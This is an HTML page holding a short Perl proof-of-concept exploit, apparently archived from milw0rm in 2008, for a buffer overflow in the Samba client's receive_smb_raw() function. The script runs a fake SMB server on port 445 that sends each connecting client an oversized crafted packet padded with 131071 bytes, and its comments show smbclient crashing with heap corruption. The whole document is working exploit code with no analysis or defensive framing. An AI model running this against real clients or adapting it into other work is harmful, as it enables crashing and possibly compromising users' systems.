<html><head><title>Samba (client) receive_smb_raw() Buffer Overflow Vulnerability PoC</title></head><pre>#!/usr/bin/perl
# 06/01/2008 - k`sOSe
#
# ~ # smbclient //localhost/w00t
# *** glibc detected *** smbclient: free(): invalid next size (fast): 0x0823c2d8 ***
#

use warnings;
use strict;
use IO::Socket;


my $sock = IO::Socket::INET-&gt;new(LocalAddr =&gt; '0.0.0.0', LocalPort =&gt; '445', Listen =&gt; 1, Reuse =&gt; 1) || die($!);

while(my $csock = $sock-&gt;accept())
{
	print $csock	&quot;\x00&quot; .
			&quot;\x01\xff\xff&quot; .
			&quot;\x41&quot; x 131071;
			
}

# milw0rm.com [2008-06-01]</pre></html>